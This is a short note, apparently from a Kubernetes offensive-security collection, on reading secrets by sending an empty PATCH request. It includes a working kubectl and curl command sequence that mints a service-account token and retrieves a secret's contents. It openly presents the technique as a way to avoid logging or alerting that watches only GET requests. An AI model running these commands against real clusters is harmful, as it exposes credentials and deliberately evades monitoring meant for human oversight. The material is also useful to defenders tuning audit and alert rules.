if you have `patch` RBAC permissions to a resource (such as a secret), you can send an empty PATCH HTTP request to the API server to reveal the contents of the secret without changing the underlying secret data. this could be used to avoid detection if a server is only logging/alerting on GET requests to secrets.


```
TOKEN="$(kubectl create token <sa-name> -n <namespace>)"
APISERVER="$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')"

curl -k -X PATCH "$APISERVER/api/v1/namespaces/<namespace>/secrets/<secret>" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/strategic-merge-patch+json" \
  -d '{}'
```

this is intentional according to the public Kubernetes API documentation:
https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.35/#patch-secret-v1-core
